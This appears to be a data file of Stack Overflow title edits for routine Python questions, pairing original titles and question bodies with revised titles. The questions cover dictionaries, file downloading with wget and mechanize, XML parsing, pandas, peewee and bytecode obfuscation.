Python: elegant way to delete empty lists from Python dict," I have a dictionary as: I wish to eliminate the empty values as: I wrote a function (following an example found on the web) I have the following questions:1- I didn't find the mistake why it always returns following - 2- Is there a built-in function to eliminate/delete Null/None/empty values from Python dictionary without creating a copy of the original dictionary? <code>  default = {'a': ['alpha'], 'b': ['beta','gamma'], 'g': []} default = {'a': ['alpha'], 'b': ['beta','gamma']} def remove_empty_keys(d): for k in d.keys(): try: if len(d[k]) < 1: del[k] except: pass return(d) remove_empty_keys(default) {'a': ['alpha'], 'b': ['beta'], 'g': []}",Python: An elegant way to delete empty lists from Python dictionary
Emulating a Browser to downloaded file?," There's an FLV file on the web that can be downloaded directly in Chrome. The file is a television program, published by CCTV (China Central Television). CCTV is a non-profit, state-owned broadcaster, financed by the Chinese tax payer, which allows us to download their content without infringing copyrights.Using wget, I can download the file from a different address, but not from the address that works in Chrome.This is what I've tried to do: This doesn't work either: The output is: What am I doing wrong?I ultimately want to download it with the Python library mechanize. Here is the code I'm using for that: This is the result: Can anyone explain how to get the mechanize code to work please? <code>  url='http://114.80.235.200/f4v/94/163005294.h264_1.f4v?10000&key=7b9b1155dc632cbab92027511adcb300401443020d&amp;playtype=1&amp;tk=163659644989925531390490125&amp;brt=2&amp;bc=0&amp;nt=0&amp;du=1496650&amp;ispid=23&amp;rc=200&amp;inf=1&amp;si=11000&amp;npc=1606&amp;pp=0&amp;ul=2&amp;mt=-1&amp;sid=10000&amp;au=0&amp;pc=0&amp;cip=222.73.44.31&amp;hf=0&amp;id=tudou&amp;itemid=135558267&amp;fi=163005294&amp;sz=59138302' wget -c $url --user-agent="""" -O xfgs.f4v wget -c $url -O xfgs.f4v Connecting to 118.26.57.12:80... connected. HTTP request sent, awaiting response... 403 Forbidden 2013-02-13 09:50:42 ERROR 403: Forbidden. import mechanize br = mechanize.Browser() br = mechanize.Browser() br.set_handle_robots(False) br.set_handle_equiv(False) br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')] url='http://114.80.235.200/f4v/94/163005294.h264_1.f4v?10000&key=7b9b1155dc632cbab92027511adcb300401443020d&amp;playtype=1&amp;tk=163659644989925531390490125&amp;brt=2&amp;bc=0&amp;nt=0&amp;du=1496650&amp;ispid=23&amp;rc=200&amp;inf=1&amp;si=11000&amp;npc=1606&amp;pp=0&amp;ul=2&amp;mt=-1&amp;sid=10000&amp;au=0&amp;pc=0&amp;cip=222.73.44.31&amp;hf=0&amp;id=tudou&amp;itemid=135558267&amp;fi=163005294&amp;sz=59138302' r = br.open(url).read() tofile=open(""/tmp/xfgs.f4v"",""w"") tofile.write(r) tofile.close() Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""/usr/lib/python2.7/dist-packages/mechanize/_mechanize.py"", line 203, in open return self._mech_open(url, data, timeout=timeout) File ""/usr/lib/python2.7/dist-packages/mechanize/_mechanize.py"", line 255, in _mech_open raise response mechanize._response.httperror_seek_wrapper: HTTP Error 403: Forbidden",Emulating a browser to download a file?
Emulating a Browser to download a file?," There's an FLV file on the web that can be downloaded directly in Chrome. The file is a television program, published by CCTV (China Central Television). CCTV is a non-profit, state-owned broadcaster, financed by the Chinese tax payer, which allows us to download their content without infringing copyrights.Using wget, I can download the file from a different address, but not from the address that works in Chrome.This is what I've tried to do: This doesn't work either: The output is: What am I doing wrong?I ultimately want to download it with the Python library mechanize. Here is the code I'm using for that: This is the result: Can anyone explain how to get the mechanize code to work please? <code>  url='http://114.80.235.200/f4v/94/163005294.h264_1.f4v?10000&key=7b9b1155dc632cbab92027511adcb300401443020d&amp;playtype=1&amp;tk=163659644989925531390490125&amp;brt=2&amp;bc=0&amp;nt=0&amp;du=1496650&amp;ispid=23&amp;rc=200&amp;inf=1&amp;si=11000&amp;npc=1606&amp;pp=0&amp;ul=2&amp;mt=-1&amp;sid=10000&amp;au=0&amp;pc=0&amp;cip=222.73.44.31&amp;hf=0&amp;id=tudou&amp;itemid=135558267&amp;fi=163005294&amp;sz=59138302' wget -c $url --user-agent="""" -O xfgs.f4v wget -c $url -O xfgs.f4v Connecting to 118.26.57.12:80... connected. HTTP request sent, awaiting response... 403 Forbidden 2013-02-13 09:50:42 ERROR 403: Forbidden. import mechanize br = mechanize.Browser() br = mechanize.Browser() br.set_handle_robots(False) br.set_handle_equiv(False) br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')] url='http://114.80.235.200/f4v/94/163005294.h264_1.f4v?10000&key=7b9b1155dc632cbab92027511adcb300401443020d&amp;playtype=1&amp;tk=163659644989925531390490125&amp;brt=2&amp;bc=0&amp;nt=0&amp;du=1496650&amp;ispid=23&amp;rc=200&amp;inf=1&amp;si=11000&amp;npc=1606&amp;pp=0&amp;ul=2&amp;mt=-1&amp;sid=10000&amp;au=0&amp;pc=0&amp;cip=222.73.44.31&amp;hf=0&amp;id=tudou&amp;itemid=135558267&amp;fi=163005294&amp;sz=59138302' r = br.open(url).read() tofile=open(""/tmp/xfgs.f4v"",""w"") tofile.write(r) tofile.close() Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""/usr/lib/python2.7/dist-packages/mechanize/_mechanize.py"", line 203, in open return self._mech_open(url, data, timeout=timeout) File ""/usr/lib/python2.7/dist-packages/mechanize/_mechanize.py"", line 255, in _mech_open raise response mechanize._response.httperror_seek_wrapper: HTTP Error 403: Forbidden",Emulating a browser to download a file?
Emulating a Browser to Download a File?," There's an FLV file on the web that can be downloaded directly in Chrome. The file is a television program, published by CCTV (China Central Television). CCTV is a non-profit, state-owned broadcaster, financed by the Chinese tax payer, which allows us to download their content without infringing copyrights.Using wget, I can download the file from a different address, but not from the address that works in Chrome.This is what I've tried to do: This doesn't work either: The output is: What am I doing wrong?I ultimately want to download it with the Python library mechanize. Here is the code I'm using for that: This is the result: Can anyone explain how to get the mechanize code to work please? <code>  url='http://114.80.235.200/f4v/94/163005294.h264_1.f4v?10000&key=7b9b1155dc632cbab92027511adcb300401443020d&amp;playtype=1&amp;tk=163659644989925531390490125&amp;brt=2&amp;bc=0&amp;nt=0&amp;du=1496650&amp;ispid=23&amp;rc=200&amp;inf=1&amp;si=11000&amp;npc=1606&amp;pp=0&amp;ul=2&amp;mt=-1&amp;sid=10000&amp;au=0&amp;pc=0&amp;cip=222.73.44.31&amp;hf=0&amp;id=tudou&amp;itemid=135558267&amp;fi=163005294&amp;sz=59138302' wget -c $url --user-agent="""" -O xfgs.f4v wget -c $url -O xfgs.f4v Connecting to 118.26.57.12:80... connected. HTTP request sent, awaiting response... 403 Forbidden 2013-02-13 09:50:42 ERROR 403: Forbidden. import mechanize br = mechanize.Browser() br = mechanize.Browser() br.set_handle_robots(False) br.set_handle_equiv(False) br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')] url='http://114.80.235.200/f4v/94/163005294.h264_1.f4v?10000&key=7b9b1155dc632cbab92027511adcb300401443020d&amp;playtype=1&amp;tk=163659644989925531390490125&amp;brt=2&amp;bc=0&amp;nt=0&amp;du=1496650&amp;ispid=23&amp;rc=200&amp;inf=1&amp;si=11000&amp;npc=1606&amp;pp=0&amp;ul=2&amp;mt=-1&amp;sid=10000&amp;au=0&amp;pc=0&amp;cip=222.73.44.31&amp;hf=0&amp;id=tudou&amp;itemid=135558267&amp;fi=163005294&amp;sz=59138302' r = br.open(url).read() tofile=open(""/tmp/xfgs.f4v"",""w"") tofile.write(r) tofile.close() Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""/usr/lib/python2.7/dist-packages/mechanize/_mechanize.py"", line 203, in open return self._mech_open(url, data, timeout=timeout) File ""/usr/lib/python2.7/dist-packages/mechanize/_mechanize.py"", line 255, in _mech_open raise response mechanize._response.httperror_seek_wrapper: HTTP Error 403: Forbidden",Emulating a browser to download a file?
tkinter entry text readonly," I am trying to obtain an Entry that starts with an ellipsis .... Here was the code I tried: I think the error is occurring because I am trying to insert text after the object has been classified as readonly.How can I insert a string in a Tkinter Entry widget that is in the ""readonly"" state? <code>  e = Entry(rootWin, width=60, state=""readonly"")e.insert(0, ""..."")","How can I insert a string in a Entry widget that is in the ""readonly"" state?"
Parsing XML with namespace in Python ElementTree," I have the following XML which I want to parse using Python's ElementTree: I want to find all owl:Class tags and then extract the value of all rdfs:label instances inside them. I am using the following code: Because of the namespace, I am getting the following error. I tried reading the document at http://effbot.org/zone/element-namespaces.htm but I am still not able to get this working since the above XML has multiple nested namespaces.Kindly let me know how to change the code to find all the owl:Class tags. <code>  <rdf:RDF xml:base=""http://dbpedia.org/ontology/"" xmlns:rdf=""http://www.w3.org/1999/02/22-rdf-syntax-ns#"" xmlns:owl=""http://www.w3.org/2002/07/owl#"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema#"" xmlns:rdfs=""http://www.w3.org/2000/01/rdf-schema#"" xmlns=""http://dbpedia.org/ontology/""> <owl:Class rdf:about=""http://dbpedia.org/ontology/BasketballLeague""> <rdfs:label xml:lang=""en"">basketball league</rdfs:label> <rdfs:comment xml:lang=""en""> a group of sports teams that compete against each other in Basketball </rdfs:comment> </owl:Class></rdf:RDF> tree = ET.parse(""filename"")root = tree.getroot()root.findall('owl:Class') SyntaxError: prefix 'owl' not found in prefix map",Parsing XML with namespace in Python via 'ElementTree'
Efficient reading of 800 GB text file in Python 2.7," I am reading an 800 GB xml file in python 2.7 and parsing it with an etree iterative parser.Currently, I am just using open('foo.txt') with no buffering argument. I am a little confused whether this is the approach I should take or I should use a buffering argument or use something from io like io.BufferedReader or io.open or io.TextIOBase.A point in the right direction would be much appreciated. <code> ",Efficient reading of 800 GB XML file in Python 2.7
is Python list comprehension with access to the index/enumerate possible?," Consider the following Python code with which I add in a new list2 all the items with indices from 1 to 3 of list1: How would you write this using list comprehension, if I have no access to the indices through enumerate?something like: but since I have no ind number, would this work? <code>  for ind, obj in enumerate(list1): if 4 > ind > 0: list2.append(obj) list2 = [x for x in list1 if 4 > ind > 0] list2 = [x for x in enumerate(list1) if 4 > ind > 0]",In Python list comprehension is it possible to access the item index?
print http request in python django," I want to print the entire request object that comes to the server. I need to see all of the parameters that the request carries from the client since I don't have the clients's code (it's an Android client). I'm in the view.py file, and I'm using the function to print the request objectPlease suggest code. It would be even better if I can print the request in the browser and not in the console. <code>  def index(request): return HttpResponse(""test params"")",Print HTTP request in Python Django
PyTables - dealing with data with size many times larger than size of memory," I'm trying to understand how PyTables manage data which size is greater than memory size.Here is comment in code of PyTables (link to GitHub): Also useful comments can be found inside _getNode method.It seems like PyTables have very smart IO buffering system which, as I understand, stores data referenced by user in fast RAM as ""aliveNodes"", keeps referenced before and presently unreferenced data as ""deadNodes"" for fast ""reviving"" it when needed, and reads data from disk if requested key is not present in both dead or alive categories. I need some expertise about how exactly PyTables handle situations when working with data larger then available memory. My specific questions:How deadNode/aliveNode system working (common picture)?What the key difference between aliveNodes/deadNodes while they both represent data stored in RAM if im right?Can limit of RAM for buffering be adjusted manually? Below the comment, there is code which reads a value from params['NODE_CACHE_SLOTS']. Can it be somehow specified by user? For example if I want to leave some RAM for other applications that need memory too?In what situations PyTables can crash or significantly slowdown when working with big amountof data? In my case can exceed memory by 100 times, what are common pitfalls in such situations?What usage of PyTables in meaning of size, structure of data, and also manipulations with data considered as 'right' for achieving best performance? Docs suggests use .flush() after each basic .append() cycle. How long this cycle actually can be? Im performing a little benchmark, comparing SQLite and PyTables in how they can handle creating a huge table with key-value pairs from big CSV files. And when I use .flush(), less frequently in main cycle, PyTables gains huge speedup. So - is it correct, to .append() relatively big chunks of data, and then use .flush()? <code>  # Nodes referenced by a variable are kept in `_aliveNodes`.# When they are no longer referenced, they move themselves# to `_deadNodes`, where they are kept until they are referenced again# or they are preempted from it by other unreferenced nodes.",PyTables dealing with data with size many times larger than size of memory
Dealing with data with size many times larger than size of memory," I'm trying to understand how PyTables manage data which size is greater than memory size.Here is comment in code of PyTables (link to GitHub): Also useful comments can be found inside _getNode method.It seems like PyTables have very smart IO buffering system which, as I understand, stores data referenced by user in fast RAM as ""aliveNodes"", keeps referenced before and presently unreferenced data as ""deadNodes"" for fast ""reviving"" it when needed, and reads data from disk if requested key is not present in both dead or alive categories. I need some expertise about how exactly PyTables handle situations when working with data larger then available memory. My specific questions:How deadNode/aliveNode system working (common picture)?What the key difference between aliveNodes/deadNodes while they both represent data stored in RAM if im right?Can limit of RAM for buffering be adjusted manually? Below the comment, there is code which reads a value from params['NODE_CACHE_SLOTS']. Can it be somehow specified by user? For example if I want to leave some RAM for other applications that need memory too?In what situations PyTables can crash or significantly slowdown when working with big amountof data? In my case can exceed memory by 100 times, what are common pitfalls in such situations?What usage of PyTables in meaning of size, structure of data, and also manipulations with data considered as 'right' for achieving best performance? Docs suggests use .flush() after each basic .append() cycle. How long this cycle actually can be? Im performing a little benchmark, comparing SQLite and PyTables in how they can handle creating a huge table with key-value pairs from big CSV files. And when I use .flush(), less frequently in main cycle, PyTables gains huge speedup. So - is it correct, to .append() relatively big chunks of data, and then use .flush()? <code>  # Nodes referenced by a variable are kept in `_aliveNodes`.# When they are no longer referenced, they move themselves# to `_deadNodes`, where they are kept until they are referenced again# or they are preempted from it by other unreferenced nodes.",PyTables dealing with data with size many times larger than size of memory
Securing python code through interpreter mutation," Actually, Dropbox made it very well, they were able to secure their desktop application made in python; I researched this a lot, but no good solution better than obfuscation, which is not very secure way to go, and you will end up seeing your code uploaded somewhere.I listened to a session made by Giovanni Bajo (the PyInstaller founder), he said Dropbox does this:Bytecode-scrambling by recompiling your CPython's interpreter, andby this, standard CPython interpreter will not be able to run it,only the recompiled cpython interpreter.All what you need to do is to shuffle the numbers below the defineloadup 8.I've never gone through Python's source code, so, I will not claim that I fully understand the above words. I need to hear the voice of experts: How to do such a thing? And if after recompilation I will be able to package my application using the available tools like PyInstaller?Update:I made some research regarding how Dropbox does this type of obfuscation/mutation, and I found this:According to Hagen Fritsch, they do it in two stages:They use TEA cipher along with an RNG seeded by some values in thecode object of each python module. They adjusted the interpreteraccordingly so that it a) Decrypts the modules andb) Prevents access to the decrypted code-objects.This would have been the straightforward path just letting dropbox decrypt everything and dump the modules using the builtin marshaller.Another trick used is the manual scrambling of the opcodes.Unfortunately this could only be fixed semiautomatically thus theirmonoalphabetic substitution cipher proved quite effective in termsof winning some time.I still want more insights on how this could be done, more over, I don't know how the decryption happens in this process... I want all the experts' voice here ... common guys where are you. <code> ",Obfuscating python bytecode through interpreter mutation
Obfuscating python code through interpreter mutation," Actually, Dropbox made it very well, they were able to secure their desktop application made in python; I researched this a lot, but no good solution better than obfuscation, which is not very secure way to go, and you will end up seeing your code uploaded somewhere.I listened to a session made by Giovanni Bajo (the PyInstaller founder), he said Dropbox does this:Bytecode-scrambling by recompiling your CPython's interpreter, andby this, standard CPython interpreter will not be able to run it,only the recompiled cpython interpreter.All what you need to do is to shuffle the numbers below the defineloadup 8.I've never gone through Python's source code, so, I will not claim that I fully understand the above words. I need to hear the voice of experts: How to do such a thing? And if after recompilation I will be able to package my application using the available tools like PyInstaller?Update:I made some research regarding how Dropbox does this type of obfuscation/mutation, and I found this:According to Hagen Fritsch, they do it in two stages:They use TEA cipher along with an RNG seeded by some values in thecode object of each python module. They adjusted the interpreteraccordingly so that it a) Decrypts the modules andb) Prevents access to the decrypted code-objects.This would have been the straightforward path just letting dropbox decrypt everything and dump the modules using the builtin marshaller.Another trick used is the manual scrambling of the opcodes.Unfortunately this could only be fixed semiautomatically thus theirmonoalphabetic substitution cipher proved quite effective in termsof winning some time.I still want more insights on how this could be done, more over, I don't know how the decryption happens in this process... I want all the experts' voice here ... common guys where are you. <code> ",Obfuscating python bytecode through interpreter mutation
"Loading a dataset from file, to use with sklearn"," I saw that with sklearn we can use some predefined datasets, for example mydataset = datasets.load_digits() the we can get an array (a numpy array?) of the dataset mydataset.data and an array of the corresponding labels mydataset.target. However I want to load my own dataset to be able to use it with sklearn. How and in which format should I load my data ? My file have the following format (each line is a data-point): <code>  -0.2080,0.3480,0.3280,0.5040,0.9320,1.0000,label1-0.2864,0.1992,0.2822,0.4398,0.7012,0.7800,label3......-0.2348,0.3826,0.6142,0.7492,0.0546,-0.4020,label2-0.1856,0.3592,0.7126,0.7366,0.3414,0.1018,label1","Loading a dataset from file, to use with sklearn/numpy, including labels"
Python: urllib.quote() throws KeyError: u'\xe9'," To encode the URI, I used urllib.quote(""schnefeld"") but when some non-ascii characters exists in string, it thorws My input strings are kln, brnshj, schnefeld etc.When I tried just printing statements in windows(Using python2.7, pyscripter IDE). But in linux it raises exception (I guess platform doesn't matter).This is what I am trying: Exploring the issue reason:in urllib.quote(), actually exception being throwin at return ''.join(map(quoter, s)).The code in urllib is: The reason for exception is in ''.join(map(quoter, s)), for every element in s, quoter function will be called and finally the list will be joined by '' and returned.For non-ascii char , the equivalent key will be %E8 which presents in _safe_map variable. But when I am calling quote(''), it searches for the key \xe8. So that the key does not exist and exception thrown.So, I just modifed s = [el.upper().replace(""\\X"",""%"") for el in s] before calling ''.join(map(quoter, s)) within try-except block. Now it works fine.But I am annoying what I have done is correct approach or it will create any other issue?And also I do have 200+ instances of linux which is very tough to deploy this fix in all instances. <code>  KeyError: u'\xe9'Code: return ''.join(map(quoter, s)) from commands import getstatusoutputqueryParams = ""schnefeld"";cmdString = ""http://baseurl"" + quote(queryParams)print getstatusoutput(cmdString) def quote(s, safe='/'): if not s: if s is None: raise TypeError('None object cannot be quoted') return s cachekey = (safe, always_safe) try: (quoter, safe) = _safe_quoters[cachekey] except KeyError: safe_map = _safe_map.copy() safe_map.update([(c, c) for c in safe]) quoter = safe_map.__getitem__ safe = always_safe + safe _safe_quoters[cachekey] = (quoter, safe) if not s.rstrip(safe): return s return ''.join(map(quoter, s))",urllib.quote() throws KeyError
urllib.quote() throws KeyError: u'\xe9'," To encode the URI, I used urllib.quote(""schnefeld"") but when some non-ascii characters exists in string, it thorws My input strings are kln, brnshj, schnefeld etc.When I tried just printing statements in windows(Using python2.7, pyscripter IDE). But in linux it raises exception (I guess platform doesn't matter).This is what I am trying: Exploring the issue reason:in urllib.quote(), actually exception being throwin at return ''.join(map(quoter, s)).The code in urllib is: The reason for exception is in ''.join(map(quoter, s)), for every element in s, quoter function will be called and finally the list will be joined by '' and returned.For non-ascii char , the equivalent key will be %E8 which presents in _safe_map variable. But when I am calling quote(''), it searches for the key \xe8. So that the key does not exist and exception thrown.So, I just modifed s = [el.upper().replace(""\\X"",""%"") for el in s] before calling ''.join(map(quoter, s)) within try-except block. Now it works fine.But I am annoying what I have done is correct approach or it will create any other issue?And also I do have 200+ instances of linux which is very tough to deploy this fix in all instances. <code>  KeyError: u'\xe9'Code: return ''.join(map(quoter, s)) from commands import getstatusoutputqueryParams = ""schnefeld"";cmdString = ""http://baseurl"" + quote(queryParams)print getstatusoutput(cmdString) def quote(s, safe='/'): if not s: if s is None: raise TypeError('None object cannot be quoted') return s cachekey = (safe, always_safe) try: (quoter, safe) = _safe_quoters[cachekey] except KeyError: safe_map = _safe_map.copy() safe_map.update([(c, c) for c in safe]) quoter = safe_map.__getitem__ safe = always_safe + safe _safe_quoters[cachekey] = (quoter, safe) if not s.rstrip(safe): return s return ''.join(map(quoter, s))",urllib.quote() throws KeyError
Functions and if - else in python. Codeacademy," Write a function, shut_down, that takes one parameter (you can use anything you like; in this case, we'd use s for string).The shut_down function should return ""Shutting down..."" when it gets ""Yes"", ""yes"", or ""YES"" as an argument, and ""Shutdown aborted!"" when it gets ""No"", ""no"", or ""NO"".If it gets anything other than those inputs, the function should return ""Sorry, I didn't understand you.""The code I wrote so far is below. It makes errors, e.g. given ""No"" as the argument, it does not return ""Shutdown aborted!"" as expected. <code>  def shut_down(s): if s == ""Yes"" or ""yes"" or ""YES"": return ""Shutting down..."" elif s == ""No"" or ""no"" or ""NO"": return ""Shutdown aborted!"" else: return ""Sorry, I didn't understand you.""",Functions and if - else in python. Mutliple conditions. Codeacademy
Python: Creating multiple csv sheets, Is there any way to create a CSV file with multiple sheets programmatically in Python? <code> ,Creating multiple CSV sheets in Python
Efficent way to sorting a large text file in python," this is a previous question where to improve the time performance of a function in python i need to find an efficient way to split my text fileI have the following text file (more than 32 GB) not sorted the first and second columns are the ID (ex: 0 -273) of location of the x,y,z point in a grid. the (minx, maxx) is the origin of my grid with size distx,disty. The the numbers of Id tiles are I need to slice the ~32 GB file in n (= len(tiles_id)) numbers of files. i can do this without sorting but reading n times the file. For this reason I wish to find an efficient splitting method for the file starting form (0,0) (= tiles_id[0]) . After that i can read only one time the splitted files. <code>  ....................0 274 593869.99 6734999.96 121.83 1,0 273 593869.51 6734999.92 121.57 1,0 273 593869.15 6734999.89 121.57 1,0 273 593868.79 6734999.86 121.65 1,0 272 593868.44 6734999.84 121.65 1,0 273 593869.00 6734999.94 124.21 1,0 273 593868.68 6734999.92 124.32 1,0 274 593868.39 6734999.90 124.44 1,0 275 593866.94 6734999.71 121.37 1,0 273 593868.73 6734999.99 127.28 1,............................. def point_grid_id(x,y,minx,maxy,distx,disty): """"""give id (row,col)"""""" col = int((x - minx)/distx) row = int((maxy - y)/disty) return (row, col) tiles_id = [j for j in np.ndindex(ny, nx)] #ny = number of row, nx= number of columns from [(0,0),(0,1),(0,2),...,(ny-1,nx-1)]n = len(tiles_id)",Efficent way to split a large text file in python
Pandas count(distinct ) equivalent," I am using Pandas as a database substitute as I have multiple databases (Oracle, SQLServer, etc.), and I am unable to make a sequence of commands to a SQL equivalent.I have a table loaded in a DataFrame with some columns: In SQL, to count the amount of different clients per year would be: And the result would be How can I do that in Pandas? <code>  YEARMONTH, CLIENTCODE, SIZE, etc., etc. SELECT count(distinct CLIENTCODE) FROM table GROUP BY YEARMONTH; 201301 5000201302 13245",Pandas 'count(distinct)' equivalent
Pandas count(distinct) equivalent," I am using Pandas as a database substitute as I have multiple databases (Oracle, SQLServer, etc.), and I am unable to make a sequence of commands to a SQL equivalent.I have a table loaded in a DataFrame with some columns: In SQL, to count the amount of different clients per year would be: And the result would be How can I do that in Pandas? <code>  YEARMONTH, CLIENTCODE, SIZE, etc., etc. SELECT count(distinct CLIENTCODE) FROM table GROUP BY YEARMONTH; 201301 5000201302 13245",Pandas 'count(distinct)' equivalent
The correct way to override the `__dir__` method in python," This question is meant to be more about __dir__ than about numpy.I have a subclass of numpy.recarray (in python 2.7, numpy 1.6.2), and I noticed recarray's field names are not listed when diring the object (and therefore ipython's autocomplete doesn't work).Trying to fix it, I tried overriding __dir__ in my subclass, like this: which resulted with: AttributeError: 'super' object has no attribute '__dir__'.(I found here this should actually work in python 3.3...)As a workaround, I tried: As far as I can tell, this one works, but of course, not as elegantly.Questions:Is the latter solution correct in my case, i.e. for a subclass of recarray?Is there a way to make it work in the general case? It seems to me it wouldn't work with multiple inheritance (breaking the super-call chain), and of course, for objects with no __dict__...Do you know why recarray does not support listing its field names to begin with? mere oversight? <code>  def __dir__(self): return sorted(set( super(MyRecArray, self).__dir__() + \ self.__dict__.keys() + self.dtype.fields.keys())) def __dir__(self): return sorted(set( dir(type(self)) + \ self.__dict__.keys() + self.dtype.fields.keys()))",What is the correct way to override the __dir__ method?
The correct way to override the __dir__ method in python," This question is meant to be more about __dir__ than about numpy.I have a subclass of numpy.recarray (in python 2.7, numpy 1.6.2), and I noticed recarray's field names are not listed when diring the object (and therefore ipython's autocomplete doesn't work).Trying to fix it, I tried overriding __dir__ in my subclass, like this: which resulted with: AttributeError: 'super' object has no attribute '__dir__'.(I found here this should actually work in python 3.3...)As a workaround, I tried: As far as I can tell, this one works, but of course, not as elegantly.Questions:Is the latter solution correct in my case, i.e. for a subclass of recarray?Is there a way to make it work in the general case? It seems to me it wouldn't work with multiple inheritance (breaking the super-call chain), and of course, for objects with no __dict__...Do you know why recarray does not support listing its field names to begin with? mere oversight? <code>  def __dir__(self): return sorted(set( super(MyRecArray, self).__dir__() + \ self.__dict__.keys() + self.dtype.fields.keys())) def __dir__(self): return sorted(set( dir(type(self)) + \ self.__dict__.keys() + self.dtype.fields.keys()))",What is the correct way to override the __dir__ method?
Does gunicorn + gevent monkey patch threadlocals to be greenlet-friendly automatically?," When running gunicorn in gevent mode, are the monkey patches (particularly those for threadlocals) described here, which make threadlocals greenlet-locals, already applied automatically? (I am running django and currently use threadlocals for a bit of fast-caching of large query results -- I understand gevent/greenlet uses an alternative model to traditional threading, thus my concern). <code> ",Does gunicorn + gevent monkey patch threadlocals to be greenlet-locals automatically?
q: python peewee mysql - why is peewee including the 'id' column into the select query?," I am trying to learn how to use peewee with mysql. I have an existing database on a mysql server with an existing table. The table is currently empty (I am just testing right now). I get the following error: Why is peewee adding the 'id' column into the select query? I do not have an id column in the table that already exists in the database. I simply want to work with the existing table and not depend on peewee having to create one every time I want to interact with the database. This is where I believe the error is.The result of the query should be empty since the table is empty but since I am learning I just wanted to try out the code. I appreciate your help.EDITBased on the helpful responses by Wooble and Francis I come to wonder whether it even makes sense for me to use peewee or another ORM like sqlalchemy. What are the benefits of using an ORM instead of just running direct queries in python using MySQLdb? This is what I expect to be doing:-automatically downloading data from various web servers. Most of the data is in xls or csv format. I can convert the xls into csv using the xlrd package.-parsing/processing the data in list objects before inserting/bulk-inserting into a mysql db table.-running complex queries to export data from mysql into python into appropriate data structured (lists for example) for various statistical computation that is easier to do in python instead of mysql. Anything that can be done in mysql will be done there but I may run complex regressions in python.-run various graphical packages on the data retrieved from queries. Some of this may include using the ggplot2 package (from R-project), which is an advanced graphical package. So I will involve some R/Python integration.Given the above - is it best that I spend the hours hacking away to learn ORM/Peewee/SQLAlchemy or stick to direct mysql queries using MySQLdb?  <code>  >>> db = MySQLDatabase('nhl', user='root', passwd='blahblah')>>> db.connect()>>> class schedule(Model):... date = DateField()... team = CharField()... class Meta:... database = db>>> test = schedule.select()>>> test<class '__main__.schedule'> SELECT t1.`id`, t1.`date`, t1.`team` FROM `nhl` AS t1 []>>> test.get() Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1408, in get return clone.execute().next() File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1437, in execute self._qr = QueryResultWrapper(self.model_class, self._execute(), query_meta) File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1232, in _execute return self.database.execute_sql(sql, params, self.require_commit) File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1602, in execute_sql res = cursor.execute(sql, params or ()) File ""/usr/lib64/python2.6/site-packages/MySQLdb/cursors.py"", line 201, in execute self.errorhandler(self, exc, value) File ""/usr/lib64/python2.6/site-packages/MySQLdb/connections.py"", line 36, in defaulterrorhandler raise errorclass, errorvalue_mysql_exceptions.OperationalError: (1054, ""Unknown column 't1.id' in 'field list'"")",Why is peewee including the 'id' column into the mysql select query?
why is peewee including the 'id' column into the select query?," I am trying to learn how to use peewee with mysql. I have an existing database on a mysql server with an existing table. The table is currently empty (I am just testing right now). I get the following error: Why is peewee adding the 'id' column into the select query? I do not have an id column in the table that already exists in the database. I simply want to work with the existing table and not depend on peewee having to create one every time I want to interact with the database. This is where I believe the error is.The result of the query should be empty since the table is empty but since I am learning I just wanted to try out the code. I appreciate your help.EDITBased on the helpful responses by Wooble and Francis I come to wonder whether it even makes sense for me to use peewee or another ORM like sqlalchemy. What are the benefits of using an ORM instead of just running direct queries in python using MySQLdb? This is what I expect to be doing:-automatically downloading data from various web servers. Most of the data is in xls or csv format. I can convert the xls into csv using the xlrd package.-parsing/processing the data in list objects before inserting/bulk-inserting into a mysql db table.-running complex queries to export data from mysql into python into appropriate data structured (lists for example) for various statistical computation that is easier to do in python instead of mysql. Anything that can be done in mysql will be done there but I may run complex regressions in python.-run various graphical packages on the data retrieved from queries. Some of this may include using the ggplot2 package (from R-project), which is an advanced graphical package. So I will involve some R/Python integration.Given the above - is it best that I spend the hours hacking away to learn ORM/Peewee/SQLAlchemy or stick to direct mysql queries using MySQLdb?  <code>  >>> db = MySQLDatabase('nhl', user='root', passwd='blahblah')>>> db.connect()>>> class schedule(Model):... date = DateField()... team = CharField()... class Meta:... database = db>>> test = schedule.select()>>> test<class '__main__.schedule'> SELECT t1.`id`, t1.`date`, t1.`team` FROM `nhl` AS t1 []>>> test.get() Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1408, in get return clone.execute().next() File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1437, in execute self._qr = QueryResultWrapper(self.model_class, self._execute(), query_meta) File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1232, in _execute return self.database.execute_sql(sql, params, self.require_commit) File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1602, in execute_sql res = cursor.execute(sql, params or ()) File ""/usr/lib64/python2.6/site-packages/MySQLdb/cursors.py"", line 201, in execute self.errorhandler(self, exc, value) File ""/usr/lib64/python2.6/site-packages/MySQLdb/connections.py"", line 36, in defaulterrorhandler raise errorclass, errorvalue_mysql_exceptions.OperationalError: (1054, ""Unknown column 't1.id' in 'field list'"")",Why is peewee including the 'id' column into the mysql select query?
